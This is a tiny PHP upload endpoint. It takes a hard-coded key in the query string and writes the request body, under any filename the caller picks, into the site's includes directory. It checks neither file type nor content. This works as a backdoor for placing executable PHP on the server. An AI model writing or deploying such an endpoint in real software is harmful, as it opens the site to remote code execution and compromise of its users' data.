<?php
// upload_inc.php - 上传到 includes 目录
if (!isset($_GET['key']) || $_GET['key'] !== 'godaily2026') { http_response_code(403); exit; }
$content = file_get_contents('php://input');
$filename = isset($_GET['name']) ? basename($_GET['name']) : 'upload.txt';
$targetFile = __DIR__ . '/includes/' . $filename;
$ok = file_put_contents($targetFile, $content);
echo $ok !== false ? "OK:$ok" : "FAILED";
